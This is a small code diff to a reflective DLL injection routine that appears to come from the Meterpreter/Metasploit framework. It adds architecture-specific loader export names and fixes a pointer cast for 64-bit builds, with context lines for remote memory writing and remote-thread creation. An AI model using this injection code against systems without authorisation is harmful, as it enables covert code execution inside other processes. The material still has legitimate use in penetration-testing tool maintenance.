@@ -482,7 +482,11 @@ DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLenght )
 			BREAK_WITH_ERROR( "[INJECT] inject_dll.  No Dll buffer supplied.", ERROR_INVALID_PARAMETER );
 
 		// check if the library has a ReflectiveLoader...
-		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpDllBuffer );
+#ifdef _WIN64
+		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpDllBuffer, "?ReflectiveLoader@@YA_KPEAX@Z");
+#else
+		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpDllBuffer, "?ReflectiveLoader@@YGKPAX@Z");
+#endif
 		if( !dwReflectiveLoaderOffset )
 			BREAK_WITH_ERROR( "[INJECT] inject_dll. GetReflectiveLoaderOffset failed.", ERROR_INVALID_FUNCTION );
 
@@ -515,7 +519,7 @@ DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLenght )
 			BREAK_ON_ERROR( "[INJECT] inject_dll. WriteProcessMemory 2 failed" ); 
 
 		// add the offset to ReflectiveLoader() to the remote library address...
-		lpReflectiveLoader = (LPVOID)( (DWORD)lpRemoteLibraryBuffer + (DWORD)dwReflectiveLoaderOffset );
+		lpReflectiveLoader = (LPVOID)( (UINT_PTR)lpRemoteLibraryBuffer + (DWORD)dwReflectiveLoaderOffset );
 	
 		// First we try to inject by directly creating a remote thread in the target process
 		if( inject_via_remotethread( hProcess, dwMeterpreterArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
